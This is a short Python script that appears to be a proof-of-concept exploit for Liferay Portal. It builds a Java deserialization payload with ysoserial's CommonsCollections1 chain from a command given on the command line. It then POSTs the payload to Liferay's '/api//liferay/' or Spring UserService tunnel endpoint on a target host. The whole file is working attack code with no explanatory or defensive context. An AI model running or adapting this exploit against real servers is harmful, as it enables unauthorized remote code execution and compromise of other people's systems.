import sys


def exec(command):
    import subprocess
    return subprocess.check_output(['java', '-jar',
                                    'ysoserial-all.jar', 'CommonsCollections1', command])


def main():
    import requests
    import re
    host = re.sub("/*$", "", sys.argv[1])
    endpoint1 = f"{host}/api//liferay/"
    endpoint2 = f"{host}/api//spring/com_liferay_portal_service_spring_UserService-http"

    endpoint = sys.argv[2]
    if endpoint == "liferay":
        endpoint = endpoint1
    elif endpoint == "spring":
        endpoint = endpoint2
    else:
        exit("Invalid endpoint")

    payload = exec(sys.argv[3])
    print(requests.post(endpoint, data=payload).text)


if __name__ == '__main__':
    main()
